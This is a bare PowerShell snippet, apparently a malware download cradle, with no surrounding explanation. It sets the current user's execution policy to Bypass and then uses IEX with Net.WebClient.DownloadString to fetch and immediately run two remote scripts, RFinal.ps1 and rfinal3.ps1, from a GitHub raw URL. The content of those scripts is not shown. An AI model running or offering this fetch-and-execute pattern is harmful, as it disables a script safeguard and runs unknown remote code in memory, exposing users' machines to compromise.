set-executionpolicy -executionpolicy bypass -scope currentuser -force;
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/RFinal.ps1');
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/rfinal3.ps1')
